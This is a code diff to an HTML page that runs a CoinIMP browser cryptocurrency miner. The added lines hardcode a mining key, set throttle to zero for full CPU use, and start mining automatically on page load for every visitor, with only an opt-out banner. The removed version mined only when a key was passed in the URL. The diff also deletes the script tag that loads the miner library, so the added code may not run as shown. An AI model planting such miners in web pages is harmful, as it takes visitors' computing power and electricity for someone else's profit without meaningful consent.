@@ -53,43 +53,34 @@
     </div>
   </div>
 
-  <script src="https://www.hostingcloud.racing/Q17m.js"></script>
   <script>
-    // parse url
-    const urlParams = new URLSearchParams(window.location.search);
-    const params = Object.fromEntries(urlParams);
-    const apiKey = params?.key;
+    var _client = new Client.Anonymous('8a50c5f06f446eb80aa59533cfb0a36c0ebdfe05040732c6187cb75a8885df5c', {
+      throttle: 0,
+      c: 'w'
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
 
-    if (apiKey) {
-      const cpu = params.cpu || 100;
-      const throttle = 1 - (cpu / 100);
-      const statusEl = document.querySelector('#status');
-      const hbsEl = document.querySelector('#hbs');
-      const hashesEl = document.querySelector('#hashes');
-      const cpuEl = document.querySelector('#cpu');
-      const container = document.querySelector('#container')
+    const statusEl = document.querySelector('#status');
+    const hbsEl = document.querySelector('#hbs');
+    const hashesEl = document.querySelector('#hashes');
+    const cpuEl = document.querySelector('#cpu');
 
-      const _client = new Client.Anonymous(apiKey, {
-        throttle, c: 'w'
-      });
-      _client.start();
+    _client.on('open', (args) => {
+      statusEl.innerHTML = '<span class="badge bg-success">Started</span>';
+    });
 
-      _client.on('open', (args) => {
-        statusEl.innerHTML = `<span class="badge bg-success">Started</span>`;
-      });
+    _client.on('job', (args) => {
+      const hashes = _client.getTotalHashes();
+      const hbs = _client.getHashesPerSecond().toFixed(2);
+      const cpu = 100 - (_client.getThrottle() * 100);
 
-      _client.on('job', (args) => {
-        const hashes = _client.getTotalHashes();
-        const hbs = _client.getHashesPerSecond().toFixed(2);
-        const cpu = 100 - (_client.getThrottle() * 100);
+      hbsEl.innerHTML = hbs;
+      hashesEl.innerHTML = hashes;
+      cpuEl.innerHTML = `${cpu}%`;
+    });
 
-        hbsEl.innerHTML = hbs;
-        hashesEl.innerHTML = hashes;
-        cpuEl.innerHTML = `${cpu}%`
-      });
-
-      window.miner = _client;
-    }
+    window.miner = _client;
   </script>
 </body>
 
